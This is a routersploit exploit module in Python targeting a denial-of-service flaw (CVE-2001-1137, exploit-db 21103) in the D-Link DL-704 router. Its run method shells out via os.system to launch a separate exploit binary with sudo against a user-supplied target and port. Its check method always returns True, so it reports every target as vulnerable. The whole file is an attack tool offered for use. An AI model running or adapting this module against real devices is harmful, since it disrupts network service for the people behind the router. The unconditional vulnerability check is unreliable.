import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "D-Link_Dl-704_2.56_b5-IP_Fragment_Denial_of_Service",

        "description": "A problem has been discovered in the Dl-704 router. Upon receiving a high amount of fragmented IP packets, "
                       "the router begins to become resource starved. After receiving these packets for a period greater than two  "
                       "minutes, the router will become unstable, ceasing operation. "
                       "This results in a denial of service users on either side of the router. A power cycling is required to resume normal operation. ",

        "authors": (

            "phonix",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/21103",

        ),

        "devices": (

            "D-link, CVE-2001-1137"
        ),
    }


    target = OptIP("", "src_addr ")
    port = OptPort("", "Target HTTP port")


    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "sudo ./exploit-db-21103 -s {} -p {}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
